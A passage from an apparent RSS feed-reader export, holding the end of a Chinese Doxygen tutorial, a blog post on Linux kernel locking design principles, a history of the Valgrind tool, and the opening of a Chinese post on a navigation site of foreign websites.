<span>version</span><span><span>=</span><span>\"</span>1.0<span>\"</span></span><span>&gt;</span></span>\n  <span><span><span>&lt;</span>navindex</span><span>&gt;</span></span>\n    <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>usergroup<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span>友情链接（演示如何外链）<span>\"</span></span><span>&gt;</span></span>\n      <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>user<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span>百度<span>\"</span></span> <span>url</span><span><span>=</span><span>\"</span>http://www.baidu.com<span>\"</span></span> <span>/&gt;</span></span>\n      <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>user<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span>163<span>\"</span></span> <span>url</span><span><span>=</span><span>\"</span>http://www.163.com<span>\"</span></span> <span>/&gt;</span></span>\n    <span><span><span>&lt;/</span>tab</span><span>&gt;</span></span>\n    <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>usergroup<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span>数学库（演示如何链接文件）<span>\"</span></span><span>&gt;</span></span>\n      <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>user<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>url</span><span><span>=</span><span>\"</span>@ref math.h<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span>math<span>\"</span></span> <span>/&gt;</span></span>\n      <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>user<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>url</span><span><span>=</span><span>\"</span>@ref math2.h<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span>math2<span>\"</span></span> <span>/&gt;</span></span>\n    <span><span><span>&lt;/</span>tab</span><span>&gt;</span></span>\n    <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>usergroup<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span>三角函数（演示链接函数、结构体）<span>\"</span></span><span>&gt;</span></span>\n      <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>user<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>url</span><span><span>=</span><span>\"</span>@ref sin<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span>sin<span>\"</span></span> <span>/&gt;</span></span>\n      <span><span><span>&lt;</span>tab</span> <span>type</span><span><span>=</span><span>\"</span>user<span>\"</span></span> <span>visible</span><span><span>=</span><span>\"</span>yes<span>\"</span></span> <span>url</span><span><span>=</span><span>\"</span>@ref sin2<span>\"</span></span> <span>title</span><span><span>=</span><span>\"</span>sin2<span>\"</span></span> <span>/&gt;</span></span>\n    <span><span><span>&lt;/</span>tab</span><span>&gt;</span></span>\n  <span><span><span>&lt;/</span>navindex</span><span>&gt;</span></span>\n<span><span><span>&lt;/</span>doxygenlayout</span><span>&gt;</span></span><span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-14.webp\" alt=\"img\"></p>\n<h4>4.4 完全自定义</h4>\n<p>如果Doxygen输出的界面实在不入你的法眼，4.1~4.3介绍的定制化功能也不能彻底满足你的需求。那么你需要根据Doxygen输出的XML数据自行生成界面了。<br>\n(1) 将<code>GENERATE_XML</code>配置为<code>YES</code><br>\n(2) 去输出目录寻找生成的XML文件，XML文件包括了函数信息、注释信息等<br>\n(3) 自己写程序读取XML文件，并生成漂亮的文档</p>\n<h3>第5章 Markdown支持</h3>\n<blockquote>\n<p>待补充完善</p>\n</blockquote>\n<p>Markdown在工业界是非常流行的文档格式，文件名以.md结尾，其简洁直观的语法深受广大程序员喜爱。对Markdown本身的介绍超出了本文范围，本章介绍Doxygen对Markdown的支持。</p>\n<h4>5.1 为.md文件生成文档</h4>\n<h4>5.2 在代码注释中使用Markdown语法</h4>\n<h3>第6章 搜索功能</h3>\n<h2>Gitlab CI/CD使用</h2>\n<blockquote>\n<p>https://gitlab.com/pages/doxygen</p>\n<p>结合Docker和Gitlab CI/CD使用案例</p>\n</blockquote>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211032.webp\" alt=\"Gitlab Doxygen运行效果如下\"></p>\n<h2>参考资源</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"noopener\" href=\"http://doxygen.nl/\">Doxygen 官网</a></li>\n<li><a target=\"_blank\" rel=\"noopener\" href=\"https://www.doxygen.nl/manual/docblocks.html#cppblock\">官网注释例子</a></li>\n<li><a target=\"_blank\" rel=\"noopener\" href=\"https://www.jianshu.com/p/bf5afbbe183b\">Doxygen文档生成工具教程</a></li>\n<li><a target=\"_blank\" rel=\"noopener\" href=\"https://cedar-renjun.github.io/2014/03/21/learn-doxygen-in-10-minutes/\">Doxygen 10 分钟入门教程</a></li>\n<li><a target=\"_blank\" rel=\"noopener\" href=\"https://gitlab.com/pages/doxygen\">Gitlab CI/CD doxygen</a></li>\n</ul>\n"
    },
    "origin": {
        "streamId": 34,
        "title": "夜法之书",
        "htmlUrl": "https://blog.17lai.site/",
        "feedUrl": "https://blog.17lai.site/atom.xml"
    }
},
{
    "id": "http://blog.ffwll.ch/2022/07/locking-engineering.html",
    "timestampUsec": "1659344373818487",
    "categories": [
        "In-Depth Tech",
        "user/-/state/com.google/unread",
        "user/-/state/com.google/starred"
    ],
    "title": "Locking Engineering Principles",
    "author": "",
    "published": 1658880000,
    "updated": 1658880000,
    "alternate": [
        {
            "href": "http://blog.ffwll.ch/2022/07/locking-engineering.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>For various reasons I spent the last two years way too much looking at code with\nterrible locking design and trying to rectify it, instead of a lot more actual\nbuilding cool things. Symptomatic that the last post here on my neglected blog\nis also a <a href=\"http://blog.ffwll.ch/2020/08/lockdep-false-positives.html\">rant on lockdep abuse</a>.</p>\n\n<p>I tried to distill all the lessons learned into some training slides, and this\ntwo part is the writeup of the same. There are some GPU specific rules, but I\nthink the key points should apply to at least apply to kernel drivers in\ngeneral.</p>\n\n<p>The first part here lays out some principles, the <a href=\"http://blog.ffwll.ch/2022/08/locking-hierarchy.html\">second part builds a locking\nengineering design pattern hierarchy</a> from the\nmost easiest to understand and maintain to the most nightmare inducing\napproaches.</p>\n\n<p>Also with locking engineering I mean the general problem of protecting data\nstructures against concurrent access by multiple threads and trying to ensure\nthat each sufficiently consistent view of the data it reads and that the updates\nit commits won’t result in confusion. Of course it highly depends upon the\nprecise requirements what exactly sufficiently consistent means, but figuring\nout these kind of questions is out of scope for this little series here.</p>\n\n\n<h2>Priorities in Locking Engineering</h2>\n\n<p>Designing a correct locking scheme is hard, validating that your code actually\nimplements your design is harder, and then debugging when - not if! - you\nscrewed up is even worse. Therefore the absolute most important rule in locking\nengineering, at least if you want to have any chance at winning this game, is to\nmake the design as simple and dumb as possible.</p>\n\n<h3>1. Make it Dumb</h3>\n\n<p>Since this is <em>the</em> key principle the entire second part of this series will go\nthrough a lot of different locking design patterns, from the simplest and\ndumbest and easiest to understand, to the most hair-raising horrors of\ncomplexity and trickiness.</p>\n\n<p>Meanwhile let’s continue to look at everything else that matters.</p>\n\n<h3>2. Make it Correct</h3>\n\n<p>Since simple doesn’t necessarily mean correct, especially when transferring a\nconcept from design to code, we need guidelines. On the design front the most\nimportant one is to <a href=\"http://blog.ffwll.ch/2020/08/lockdep-false-positives.html\">design for lockdep, and not fight\nit</a>, for which I already wrote a full length\nrant. Here I will only go through the main lessons: Validating locking by hand\nagainst all the other locking designs and nesting rules the kernel has overall\nis nigh impossible, extremely slow, something only few people can do with any\nchance of success and hence in almost all cases a complete waste of time. We\nneed tools to automate this, and in the Linux kernel this is lockdep.</p>\n\n<p>Therefore if lockdep doesn’t understand your locking design your design is at\nfault, not lockdep. Adjust accordingly.</p>\n\n<p>A corollary is that you actually need to teach lockdep your locking rules,\nbecause otherwise different drivers or subsystems will end up with defacto\nincompatible nesting and dependencies. Which, as long as you never exercise them\non the same kernel boot-up, much less same machine, wont make lockdep grumpy.\nBut it will make maintainers very much question why they are doing what they’re\ndoing.</p>\n\n<p>Hence at driver/subsystem/whatever load time, when CONFIG_LOCKDEP is enabled,\ntake all key locks in the correct order. One example for this relevant\nto GPU drivers is <a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/drivers/dma-buf/dma-resv.c?h=v5.18#n685\">in the dma-buf\nsubsystem</a>.</p>\n\n<p>In the same spirit, at every entry point to your library or subsytem, or\nanything else big, validate that the callers hold up the locking contract with\n<code>might_lock(), might_sleep(), might_alloc()</code> and all the variants and\nmore specific implementations of this. Note that there’s a huge overlap between\nlocking contracts and calling context in general (like interrupt safety, or\nwhether memory allocation is allowed to call into direct reclaim), and since all\nthese functions compile away to nothing when debugging is disabled there’s\nreally no cost in sprinkling them around very liberally.</p>\n\n<p>On the implementation and coding side there’s a few rules of thumb to follow:</p>\n\n<ul>\n  <li>\n    <p>Never invent your own locking primitives, you’ll get them wrong, or at least\nbuild something that’s slow. The kernel’s locks are built and tuned by people\nwho’ve done nothing else their entire career, you wont beat them except in bug\ncount, and that by a lot.</p>\n  </li>\n  <li>\n    <p>The same holds for synchronization primitives - don’t build your own with a\n<code>struct wait_queue_head</code>, or worse, hand-roll your own wait queue.\nInstead use the most specific existing function that provides the\nsynchronization you need, e.g. <code>flush_work()</code> or\n<code>flush_workqueue()</code> and the enormous pile of variants available for\nsynchronizing against scheduled work items.</p>\n\n    <p>A key reason here is that very often these more specific functions already\ncome with elaborate lockdep annotations, whereas anything hand-roll tends to\nrequire much more manual design validation.</p>\n  </li>\n  <li>\n    <p>Finally at the intersection of “make it dumb” and “make it correct”, pick the\nsimplest lock that works, like a normal mutex instead of an read-write\nsemaphore. This is because in general, stricter rules catch bugs and design\nissues quicker, hence picking a very fancy “anything goes” locking primitives\nis a bad choice.</p>\n\n    <p>As another example pick spinlocks over mutexes because spinlocks are a lot\nmore strict in what code they allow in their critical section. Hence much less\nrisk you put something silly in there by accident and close a dependency loop\nthat could lead to a deadlock.</p>\n  </li>\n</ul>\n\n<h3>3. Make it Fast</h3>\n\n<p>Speed doesn’t matter if you don’t understand the design anymore in the future,\nyou need simplicity first.</p>\n\n<p>Speed doesn’t matter if all you’re doing is crashing faster. You need\ncorrectness before speed.</p>\n\n<p>Finally speed doesn’t matter where users don’t notice it. If you\nmicro-optimize a path that doesn’t even show up in real world workloads users\ncare about, all you’ve done is wasted time and committed to future maintenance\npain for no gain at all.</p>\n\n<p>Similarly optimizing code paths which should never be run when you instead\nimprove your design are not worth it. This holds especially for GPU drivers,\nwhere the real application interfaces are OpenGL, Vulkan or similar, and there’s\nan entire driver in the userspace side - the right fix for performance issues\nis very often to radically update the contract and sharing of responsibilities\nbetween the userspace and kernel driver parts.</p>\n\n<p>The big example here is GPU address patch list processing at command submission\ntime, which was necessary for old hardware that completely lacked any useful\nconcept of a per process virtual address space. But that has changed, which\nmeans virtual addresses can stay constant, while the kernel can still freely\nmanage the physical memory by manipulating pagetables, like on the CPU.\nUnfortunately one driver in the DRM subsystem instead spent an easy engineer\ndecade of effort to tune relocations, write lots of testcases for the resulting\ncorner cases in the multi-level fastpath fallbacks, and even more time handling\nthe impressive amounts of fallout in the form of bugs and future headaches due\nto the resulting unmaintainable code complexity …</p>\n\n<p>In other subsystems where the kernel ABI is the actual application contract\nthese kind of design simplifications might instead need to be handled between\nthe subsystem’s code and driver implementations. This is what we’ve done when\nmoving from the old kernel modesetting infrastructure to atomic modesetting.\nBut sometimes no clever tricks at all help and you only get true speed with a\nradically revamped uAPI - io_uring is a great example here.</p>\n\n<h2>Protect Data, not Code</h2>\n\n<p>A common pitfall is to design locking by looking at the code, perhaps just\nsprinkling locking calls over it until it feels like it’s good enough. The right\napproach is to design locking for the data structures, which means specifying\nfor each structure or member field how it is protected against concurrent\nchanges, and how the necessary amount of consistency is maintained across the\nentire data structure with rules that stay invariant, irrespective of how code\noperates on the data. Then roll it out consistently to all the functions,\nbecause the code-first approach tends to have a lot of issues:</p>\n\n<ul>\n  <li>\n    <p>A code centric approach to locking often leads to locking rules changing over\nthe lifetime of an object, e.g. with different rules for a structure or member\nfield depending upon whether an object is in active use, maybe just cached or\nundergoing reclaim. This is hard to teach to lockdep, especially when the\nnesting rules change for different states. Lockdep assumes that the\nlocking rules are completely invariant over the lifetime of the entire kernel,\nnot just over the lifetime of an individual object or structure even.</p>\n\n    <p>Starting from the data structures on the other hand encourages that locking\nrules stay the same for a structure or member field.</p>\n  </li>\n  <li>\n    <p>Locking design that changes depending upon the code that can touch the data\nwould need either complicated documentation entirely separate from the\ncode - so high risk of becoming stale. Or the explanations, if there are any\nare sprinkled over the various functions, which means reviewers need to\nreacquire the entire relevant chunks of the code base again to make sure they\ndon’t miss an odd corner cases.</p>\n\n    <p>With data structure driven locking design there’s a perfect, because unique\nplace to document the rules - in the kerneldoc of each structure or member\nfield.</p>\n  </li>\n  <li>\n    <p>A consequence for code review is that to recheck the locking design for a code\nfirst approach every function and flow has to be checked against all others,\nand changes need to be checked against all the existing code. If this is not\ndone you might miss a corner cases where the locking falls apart with a race\ncondition or could deadlock.</p>\n\n    <p>With a data first approach to locking changes can be reviewed incrementally\nagainst the invariant rules, which means review of especially big or complex\nsubsystems actually scales.</p>\n  </li>\n  <li>\n    <p>When facing a locking bug it’s tempting to try and fix it just in the affected\ncode. By repeating that often enough a locking scheme that protects data\nacquires code specific special cases. Therefore locking issues always\nneed to be first mapped back to new or changed requirements on the data\nstructures and how they are protected.</p>\n  </li>\n</ul>\n\n<p><em>The</em> big antipattern of how you end up with code centric locking is to protect\nan entire subsystem (or worse, a group of related subsystems) with a single\nhuge lock. The canonical example was the big kernel lock <em>BKL</em>, that’s gone, but\nin many cases it’s just replaced by smaller, but still huge locks like\n<code>console_lock()</code>.</p>\n\n<p>This results in a lot of long term problems when trying to adjust the locking\ndesign later on:</p>\n\n<ul>\n  <li>\n    <p>Since the big lock protects everything, it’s often very hard to tell what it\ndoes not protect. Locking at the fringes tends to be inconsistent, and due to\nthat its coverage tends to creep ever further when people try to fix bugs\nwhere a given structure is not consistently protected by the same lock.</p>\n  </li>\n  <li>\n    <p>Also often subsystems have different entry points, e.g. consoles can be\nreached through the console subsystem directly, through vt, tty subsystems and\nalso through an enormous pile of driver specific interfaces with the fbcon\nIOCTLs as an example. Attempting to split the big lock into smaller\nper-structure locks pretty much guarantees that different entry points have to\ntake the per-object locks in opposite order, which often can only be resolved\nthrough a large-scale rewrite of all impacted subsystems.</p>\n\n    <p>Worse, as long as the big subsystem lock continues to be in use no one is\nspotting these design issues in the code flow. Hence they will slowly get\nworse instead of the code moving towards a better structure.</p>\n  </li>\n</ul>\n\n<p>For these reasons big subsystem locks tend to live way past their justified\nusefulness until code maintenance becomes nigh impossible: Because no individual\nbugfix is worth the task to really rectify the design, but each bugfix tends to\nmake the situation worse.</p>\n\n<h2>From Principles to Practice</h2>\n\n<p>Stay tuned for next week’s installment, which will cover what these principles\nmean when applying to practice: Going through a large pile of locking design\npatterns from the most desirable to the most hair raising complex.</p>"
    },
    "origin": {
        "streamId": 35,
        "title": "stuff by danvet",
        "htmlUrl": "http://blog.ffwll.ch/",
        "feedUrl": "https://blog.ffwll.ch/feed.xml"
    }
},
{
    "id": "https://nnethercote.github.io/2022/07/27/twenty-years-of-valgrind",
    "timestampUsec": "1659344445258504",
    "categories": [
        "user/-/state/com.google/unread",
        "user/-/state/com.google/starred"
    ],
    "title": "Twenty years of Valgrind",
    "author": "",
    "published": 1658880000,
    "updated": 1658880000,
    "alternate": [
        {
            "href": "https://nnethercote.github.io/2022/07/27/twenty-years-of-valgrind.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>It has been twenty years since Valgrind 1.0 was released.</p>\n\n<p><img src=\"https://nnethercote.github.io/images/2022/07/27/st-george-dragon.png\" alt=\"dragon\"></p>\n\n<p><a href=\"https://valgrind.org/\">The Valgrind website</a> says:</p>\n\n<blockquote>\n  <p>Valgrind is an instrumentation framework for building dynamic analysis tools.\nThere are Valgrind tools that can automatically detect many memory management\nand threading bugs, and profile your programs in detail. You can also use\nValgrind to build new tools.</p>\n</blockquote>\n\n<p>–</p>\n\n<p>I first met Julian Seward in late 2001. I had moved from Australia to Cambridge\nin the UK to pursue a PhD on the topic of “cache optimizations for functional\nlanguages”. The Cambridge Computer Laboratory is literally next door to a\nMicrosoft Research office, and I was soon interacting with the people there\nworking on the Glasgow Haskell Compiler. Julian was one of them.</p>\n\n<p>Shortly after that, Julian’s stint working on GHC came to a close. On his last\nday he dropped by my office in the Computer Laboratory to say goodbye. I asked\nwhat he would be doing now, and he said he was going to spend some time on a\nproject of his called Valgrind. “What’s Valgrind?” I asked. It was one of those\nthis-will-change-your-life moments.</p>\n\n<p>–</p>\n\n<p>In the mid-90s Julian wrote the <a href=\"https://en.wikipedia.org/wiki/Bzip2\">bzip2 compression\nutility</a>. He had spent some time\n<a href=\"https://ieeexplore.ieee.org/document/838157\">investigating</a> its cache\nbehaviour in order to make it faster. While doing this he created a cache\nprofiling tool called cacheprof. It parsed and annotated assembly code in order\nto add instrumentation code, gave line-by-line annotations of cache misses in\nyour source code, and came with a wrapper around gcc to make its usage\nstraightforward. (Section 7 of the <a href=\"https://nnethercote.github.io/doc/cacheprof.html\">cacheprof docs</a> have\nmore details about its origins.)</p>\n\n<p>Julian was also a fan of <a href=\"https://en.wikipedia.org/wiki/PurifyPlus\">Purify</a>, a\ncommercial tool that detected memory errors in programs at runtime and ran on\nSolaris. He hoped that someone would make an open source version for x86/Linux,\nbut eventually decided to do it himself. He had some experience with an x86\nbinary interpreter called Heimdall, but knew that binary interpretation was too\nslow to be practical. Perhaps JIT compilation could help?</p>\n\n<p>After a great deal of effort he had a working memory error detector, which\nended up with the name Valgrind. It was language independent and didn’t require\nany pre-instrumentation of source code. It worked pretty well, could handle\nlarge programs, and was getting some use from KDE developers.</p>\n\n<p>All this was an impressive achievement, because Valgrind has to do a lot of\nclever and/or nasty low-level things to work. It has to intercept every\ninstruction executed by a client program without ever losing control, even in\nthe face of syscalls, signals, and longjmp. And on top of that it has to add\nlarge amounts of instrumentation to maintain metadata about literally every bit\nof data the client program manipulates.</p>\n\n<p>–</p>\n\n<p>When Julian showed me Valgrind I thought it was pretty cool. I got a copy of\nthe code and submitted a few small improvements.</p>\n\n<p>I had been using cacheprof myself, but its assembly annotation approach was\nfragile and didn’t provide any coverage for system libraries. Not long after\nlearning about Valgrind I realised its dynamic binary instrumentation could\nprovide a more robust foundation for a cache profiling tool. I wrote Cachegrind\nand it was committed into the repository in April 2002.</p>\n\n<p>In July 2002, Valgrind 1.0 was\nreleased. The\n<a href=\"https://developers.slashdot.org/story/02/07/28/1833225/valgrind-100-released\">SlashDot post</a> said:</p>\n\n<blockquote>\n  <p>Valgrind is a C/C++ programmer’s dream come true: effortless memory\nallocation checking, uninitialised memory access, leaks etc. Purify for Linux\nhas arrived, only better: contrary to its commercial (non-Linux) sibling,\nchecking is performed directly on the executable, no re-linking necessary.</p>\n</blockquote>\n\n<p>At this point Valgrind did two things. By default it would look for memory\nerrors, but you could invoke Cachegrind with the <code>--cachesim</code> option. The\nintegration between the two modes was clunky, but both were useful.</p>\n\n<p>I then realised there was a potential clean split between the generic\ninstrumentation code and the tool-specific code. A few months later I made this\nsplit, which opened up a new world of possibilities. Memcheck was born: it\nbecame the name of the tool that did the original memory checking, and Valgrind\nbecame the name of the entire system. (Having said that, even today “Valgrind”\nand “Memcheck” are basically synonymous.) And Cachegrind was no longer bolted\non as an awkward extra piece.</p>\n\n<p>We called this the “core/skin split”. These names were my choice, inspired by\nthe custom UI “skins” you could put on software MP3 players at the time. A\nwhile later we realised “skin” was a dumb and confusing name, and we switched\nto “tool”. The name “core” has stuck, although we changed the name of the\ndirectory holding the core code from <code>core</code> to <code>coregrind</code> after learning that\nsome Linux systems were configured to periodically delete any file named\n<code>core</code>, on the assumption that such files are core dumps!</p>\n\n<p>Around this time we were joined by many talented folks who made important\ncontributions. In particular, Jeremy Fitzhardinge greatly improved the tricky\nintersection point of threads, system calls, and signals, and Tom Hughes fixed\nmany early bugs and improved debuginfo reading.</p>\n\n<p>More tools followed.</p>\n\n<ul>\n  <li>Julian wrote a data race detector called Helgrind.</li>\n  <li>Josef Weidendorfer wrote a souped-up version of Cachegrind called Callgrind.</li>\n  <li>In 2003 I wrote Massif, a heap profiler.</li>\n  <li>In 2007 Bart Van Assche wrote DRD, a different kind of race detector.</li>\n  <li>In 2010 Julian wrote\n<a href=\"https://blog.mozilla.org/jseward/2010/12/05/fun-n-games-with-dhat/\">DHAT</a>, a\ndifferent heap profiler. It could do some incredible stuff but the text-based\noutput was clunky. In 2019 I\n<a href=\"https://blog.mozilla.org/nnethercote/2019/04/17/a-better-dhat/\">overhauled</a>\nit to have a much nicer UI.</li>\n  <li>Various other lesser-known tools have been written, some of which were used\nas the basis for <a href=\"https://valgrind.org/docs/pubs.html\">research papers</a>.</li>\n</ul>\n\n<p>–</p>\n\n<p>After the core/tool split I switched the topic of my PhD away from functional\nprogramming. I finished my dissertation, entitled <a href=\"https://nnethercote.github.io/pubs/phd2004.pdf\">Dynamic Binary Analysis and\nInstrumentation</a>, in late 2004.\nI wouldn’t recommend reading it today, except perhaps chapter 3 which is a\ndecent description of how Cachegrind works. However, it was enough for me to\ngraduate and forevermore tell people that, literally, “I have a PhD in\nValgrind”. (This was a three year UK PhD, rather than a brutal six-or-more year\nUS PhD. To any potential graduate students reading this: 10/10, would\nrecommend.)</p>\n\n<p>In 2005 we published a paper at USENIX entitled <a href=\"https://nnethercote.github.io/pubs/memcheck2005.pdf\">Using Valgrind to detect\nundefined value errors with bit-precision</a>. We only\nlearned about the conference two days before the paper deadline, when an\norganiser of the co-located FREENIX workshop suggested we submit an abstract\nfor a paper about Valgrind to FREENIX. We proposed submitting a paper to USENIX\ninstead and were told “it’s not possible to do a USENIX paper in two days”.\nForty-eight frantic hours later we did and it was accepted, hooray!</p>\n\n<p>That paper focused Memcheck’s definedness checking. This is the part that\ntracks the definedness of every bit of data that a client program touches, and\ndetermines if the client program does anything dangerous with undefined or\npartially-defined values, such as branching on a condition that uses an\nundefined value, or passing an undefined value to a system call, or using an\nundefined value as an address in a memory operation. It’s a very elegant system\nthat Julian invented, combining both speed and precision. Even today, it’s\nstill a unique advantage of Memcheck over similar checking tools.</p>\n\n<p>In 2007 we published two papers. The first paper was at PLDI, entitled\n<a href=\"https://nnethercote.github.io/pubs/valgrind2007.pdf\">Valgrind: A Framework for Heavyweight Dynamic Binary\nInstrumentation</a>. This one took a lot longer than two\ndays. It’s still the best overview of Valgrind’s internals, and the most cited\npaper about Valgrind. Ten years later, it won a <a href=\"https://www.sigplan.org/Awards/PLDI/\">most influential\npaper</a> <del>weapon</del> award. I sure wasn’t\nexpecting that.</p>\n\n<p><img src=\"https://nnethercote.github.io/images/2022/07/27/pldi-award.jpg\" alt=\"award\" width=\"350\"></p>\n\n<p>The second paper was at VEE, entitled <a href=\"https://nnethercote.github.io/pubs/shadow-memory2007.pdf\">How to Shadow Every Byte of Memory Used\nby a Program</a>. It gives a nice overview of how\nMemcheck tracks extra state about every value in memory.</p>\n\n<p>There were some other awards, too.</p>\n\n<ul>\n  <li>In 2004 Valgrind won a merit (bronze) Open Source Award. (This\n<a href=\"https://www.techrepublic.com/article/open-source-awards-2004-julian-seward-for-valgrind/\">interview with\nJulian</a>\nfrom the time has some good historical information.)</li>\n  <li>In 2006 Julian won a <a href=\"https://developers.google.com/open-source/osa\">Google-O’Reilly Open Source\nAward</a> for “Best Toolmaker”.</li>\n  <li>In 2008 Valgrind won <a href=\"https://linuxdevices.org/cross-platform-tools-vendor-announces-awards-earnings/\">TrollTech’s inaugural Qt Open Source Development\nAward</a>\nfor the best open source development tool.</li>\n</ul>\n\n<p>–</p>\n\n<p>By 2010 I was fully out of academia and no longer writing research papers.\nJulian and I had both ended up at Mozilla, where I worked for twelve years and\nwhere Julian still is. Our involvement in Valgrind has gradually declined—mine\nmuch earlier than Julian’s—and our statuses today would best be described as\n“emeritus”. There have been many other\n<a href=\"https://valgrind.org/info/developers.html\">contributors</a> over the years, and\nMark Wielaard is today the lead maintainer.</p>\n\n<p>–</p>\n\n<p>It’s both delightful and surreal to see that Valgrind is still in wide use\ntoday. Julian’s original goal was to raise the bar when it came to correctness\nfor C and C++ programs. This has clearly been a huge success. Memcheck has\nfound countless bugs in countless programs, and is a standard part of the\ntesting setup for many of them.</p>\n\n<p>It did take a while to penetrate, though. In 2005 I did a postdoc where I\nworked on a project involving novel hardware design. There were several C\nprograms that simulated the hardware being designed. Students would run the\nprograms overnight to simulate a small amount of machine time. Sometimes when\nthey returned in the morning the simulations would have crashed, which was a\nbig time waster. I suggested they try Memcheck, which found a few problems that\nthey fixed, and the programs stopped crashing. But the response wasn’t a “that\nfixed the problem!” so much as a “huh, that problem seems to have gone away”.</p>\n\n<p>Thankfully, with time, the value of Memcheck has become more deeply\nappreciated. I’m pretty sure that ASan was directly inspired by Memcheck. ASan\nuses static instrumentation, which means it is faster than Memcheck but has\nincomplete coverage, e.g. for runtime generated code and system libraries. For\nthis reason it does what Memcheck does except the definedness checking, because\nthat part requires 100% instrumentation coverage to work reliably.</p>\n\n<p>Speaking of software quality, I think it’s fitting that I now work full time on\nRust, a systems programming language that didn’t exist when Valgrind was\ncreated, but which basically prevents all the problems that Memcheck detects.\nAs a result, I don’t have much use for Memcheck, but I still use Cachegrind,\nCallgrind, and DHAT all the time. I’m amazed that I’m still using Cachegrind\ntoday, given that it has hardly changed in twenty years. (I only use it for\ninstruction counts, though. I wouldn’t trust the icache/dcache results at all\ngiven that they come from a best-guess simulation of an AMD Athlon circa 2002.)\nAnd DHAT is an ongoing source of joy: I’ve never used any other profiler as\ngood at telling me precisely what I want to know.</p>\n\n<p>–</p>\n\n<p>These are some of my Valgrind stories from the past twenty years. It’s far from\na complete account, but I hope it has been interesting.</p>\n\n<p>To finish, I’ll quote the first entry in the Valgrind\n<a href=\"https://valgrind.org/docs/manual/faq.html\">FAQ</a>, which I wrote a long time\nago:</p>\n\n<blockquote>\n  <p>1.1. How do you pronounce “Valgrind”?</p>\n\n  <p>The “Val” as in the word “value”. The “grind” is pronounced with a short ‘i’ –\nie. “grinned” (rhymes with “tinned”) rather than “grined” (rhymes with “find”).</p>\n\n  <p>Don’t feel bad: almost everyone gets it wrong at first.</p>\n</blockquote>\n\n<p>Happy birthday, Valgrind!</p>"
    },
    "origin": {
        "streamId": 36,
        "title": "Nicholas Nethercote",
        "htmlUrl": "https://nnethercote.github.io/",
        "feedUrl": "https://nnethercote.github.io/feed.xml"
    }
},
{
    "id": "https://blog.shuziyimin.org/?p=1321",
    "timestampUsec": "1659487403625260",
    "categories": [
        "利器",
        "基础服务",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "翻墙后可以看什么？我做了一个数字移民导航站，已收集 200+ 网站",
    "author": ";Bates",
    "published": 1640686860,
    "updated": 1640686860,
    "alternate": [
        {
            "href": "https://blog.shuziyimin.org/1321",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h1>点击这里前往<a href=\"https://shuziyimin.org/index.html?refer=blog-title\">导航站</a></h1>\n<p><span></span></p>\n<p>数字移民网站博客相关内容一直放在二级域名 <a href=\"https://blog.shuziyimin.org/\">blog.shuziyimin.org</a> ，主站 <a href=\"https://shuziyimin.org/\">shuziyimin.org</a> 一直空着，因为不知道应该放些什么。关于导航网站的想法已经有了很久，苦于写 CSS 太麻烦，所以一直搁置，最近偶遇 <a href=\"https://blog.shuziyimin.org/\">Viggo</a> 的 <a href=\"https://blog.shuziyimin.org/\">导航站模版</a>，就用这个模版先把导航站做起来，以后想改动样式了再手动写代码。</p>\n<h1>数字移民导航站收集了什么内容</h1>\n<p>数字移民导航站介绍的网站服务和博客教程基本一致，主要关注英文主流的新闻、流媒体、电子书等内容消费；常用的效率工具与服务等。</p>\n<p><strong> 新闻 </strong></p>\n<p>在<a href=\"https://shuziyimin.org/#news-agency-1-1\">英文新闻</a>类别，推荐的网站顺序按照传统的分发渠道来排列：通讯社、公共电视广播、商业电视台、主流报纸杂志、主流新闻网站、聚合新闻平台、主流科技媒体。从客观严肃的媒体到娱乐化流量导向的媒体，这样方便大家选择适合自己水平和风格的新闻网站，对整体英文（主要是美国）journalism 有个大体的了解。</p>\n<p>网友提到另外一种方式，是将所有主流媒体按照立场来区分，打上中立、自由派与保守派的标签，并且给出公允的评价，这个媒体是事实居多，还是观点居多。这样的标签方便大家识别自己在读的媒体大致处于图谱的哪个位置。媒体立场区分的子页面会在之后补充进去。</p>\n<p><strong> 流媒体 </strong></p>\n<p>最受欢迎的流媒体仍然是 Netflix 和 Disney Plus。一些免费的流媒体平台基本只在美国提供服务，也只有英文或西语字幕，对大部分中国关注不友好。<a href=\"https://shuziyimin.org/#streaming-misic-2-4\">音乐流媒体</a>与<a 